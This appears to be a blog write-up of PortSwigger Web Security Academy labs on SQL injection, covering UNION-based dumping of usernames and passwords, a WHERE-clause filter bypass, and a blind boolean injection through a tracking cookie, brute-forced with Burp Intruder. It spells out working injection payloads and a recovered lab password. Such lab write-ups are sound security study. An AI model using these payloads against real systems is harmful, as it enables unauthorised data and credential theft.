![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/HkxK4UIj3.png)

#### Identify weak points
`https://0a7a000e034d65d28550c77a0034007c.web-security-academy.net/filter?category=Gifts' or 1=1--`

#### Specify the number of columns to return
`https://0a7a000e034d65d28550c77a0034007c.web-security-academy.net/filter?category=Gifts' union select null, null--`

=> có 2 cột

#### Defines a column with string data type

After testing 2 times for 2 columns, I found that only the 2nd column got the response back.

`https://0a7a000e034d65d28550c77a0034007c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null,%20%27col2%27--`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1w5S8Ls2.png)

#### Retrieve data in a database

Check which language the database is in.

I have tried with common payloads that print the version of SQL. then only PostgreSQL returns results.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/HklKIILsn.png)

Payload: `/filter?category=Gifts' union select  null, version() --`

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1Y1DU8in.png)

Okay, now we know the original query has only one column of string data type and the database is PostgreSQL 12.15. I will be looking for payload to concatenate strings in this database.

I refer here.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/H1HIwU8oh.png)

Final payload:
```js
/filter?category=Gifts' union select null,username||'~'||password from users--
```

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rkMpOLLoh.png)


Login with adminstrator and get solved.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BJwgFUIj2.png)

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
### Lab Description
This practical exercise contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application executes the following SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve this exercise, perform a SQL injection attack that makes the application display one or more unreleased products.

In order to carry out the SQL injection attack, you can manipulate the input parameter in the category filter to modify the query behavior. 

### Solution
Home page:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r1-4gnHsn.png)

View source code:
```html
<div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Tech gifts</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category selected" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating1.png">
                            $58.82
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/16.jpg">
                            <h3>Photobomb Backdrops</h3>
                            <img src="/resources/images/rating3.png">
                            $73.75
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating2.png">
                            $83.40
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
```

From the source code above I found some interesting links.
- `/filter` accepts a `category` parameter with the GET method containing the name of the category.
- `/product?productId=7` accepts a GET parameter of `productid` with the value of the product number in the category.

According to the requirements of the topic, we need to display other categories in the database.

I tried the SQL injection test in `/product`:
```js
/product?productId=7" or 1=1-- -
```

However, the returned result is .

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/HkARz3Ss2.png)

hmm. it seems this parameter does not exist SQL injection vulnerability.

Continue with the parameter
```js
/filter?category=Food+%26+Drink
```

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/SJ4tQ3rj3.png)


When I added the payload `'---` there was a strange response.

`/filter?category=Food+%26+Drink'--`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1rjX3Bih.png)

Strange. The returned result contains 4 products. This can see my sql injection payload was successful.

When I pass in `Food+%26+Drink'--` the query is being executed as follows:
```sql
SELECT * FROM products WHERE category = 'Food Drink'--'AND realeased = 1
```

Yes, the product that appears with `Hydrated Crackers` is an unreleased product.

Now to be able to print all products of the entire category to the screen, we will use the boolean operator `OR 1=1` to do it.

```js
/filter?category=Food+%26+Drink%27%20or%201=1%20--
```

Result:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BykAVnHoh.png)

So I was able to read the data hidden inside the database.

## Lab: Blind SQL injection with conditional responses
### Description

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1uMUDLs2.png)


### Solution
Home page:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rJJ8Lrwin.png)

I have retried the previous payload but still no success.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/B1XpLHDsn.png)

no response results. This indicates that this is a Blind Vulnerability.
According to the hypothesis of the problem. We can attack on `Cookie: TrackingId` to perform SQL injection vulnerability testing.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r1c0wBPin.png)

I will edit the TrackingId.

Edit Cookie and change it to:
`Cookie: TrackingId=C6PhzPT1xSgEhx8X' and '1'='1;`

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BkWkKBwoh.png)

The string `Welcome back` appears.

If I use payload `Cookie: TrackingId=C6PhzPT1xSgEhx8X' and '1'='2;` the string `Welcome back` does not appear. This tells me this is a SQL injection weakness.

Next insert a condition to check if there is a table `Users`?
I would use: `Select 'a' from users limit 1` . If the string `a` is returned => does the table `users` exist. I'll set this to a boolean to test.
If this result is True then the sequence `Welcome back` will appear and vice versa.

Edit payload:
```js
Cookie: TrackingId=C6PhzPT1xSgEhx8X' and (select 'a' from users limit 1)='a;
```

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/B1jR5rDs3.png)

appears the string `Welcome back` which indicates that there is a table of `users` in this database.

Next, we need to check if any known username exists in the database.
Edit payload:
```js
Cookie: TrackingId=C6PhzPT1xSgEhx8X' and (select 'a' from users  where username='administrator' limit 1)='a;
```
Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1JKiHDj3.png)


=> in the users table there is username = administrator

The next step is to determine how many characters the password has:
Edit payload:
```js
Cookie: TrackingId=C6PhzPT1xSgEhx8X' and (select 'a' from users where username='administrator' and length(password) > 1)='a;
```
Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ryYKhBvoh.png)

=> The password `administrator` exists and is more than 1 character.

I changed the payload a bit to check how many characters are in the administrator password.
```js
Cookie: TrackingId=C6PhzPT1xSgEhx8X' and (select 'a' from users  where username='administrator' and length(password) = 20)='a; 
```
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rJBtTHvjh.png)
=> `administrator` password have 20 character.

Once the length of the password has been obtained, the next step is to check that each value is in each position.

I will use the `SUBSTRING` function to access each character by position in the password of the specified account.

Payload:
```js
Cookie: TrackingId=C6PhzPT1xSgEhx8X' and (select substring(password,1,1) from users where username='administrator')='a;
```

=> this payload will extract a character in the password and check with a specific value. For this value we can burp force to find the exact value.

Next, add the phrase `Welcome back` to the Grep-Match section of the settings to test.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1nNxLvoh.png)


Once we have determined the correct character for the first character in the password, we can increase the second parameter until the length of the password is reached (equal to 20).

oke, let's start!!! :statue_of_liberty: 
I will proceed to move the request to the Burp-Intruder section to perform the brute force attack.

there are 2 places that need to be inserted as follows: one to increase the index in the password, one to check what the correct character is?
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/B1UAxIvoh.png)

Select the attack mode as cluster bomb.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BksrGIPi2.png)

Wordlist for payload1 will be numbers 1-20.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rkovZIDjh.png)

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/SJzoW8Poh.png)
Position number 2 is the alphabetical characters to check. There are 36 characters consisting of letters and numbers.

=> we need send 720 request to perform this attack. :-1: 

We can see the following result.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S148j8Pih.png)

Now just sort it from 1 to 20 we will get the password.

=> password is `ujsjah2ahvljbs4k267m`

Login and get solved.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/SyhXh8Ps2.png)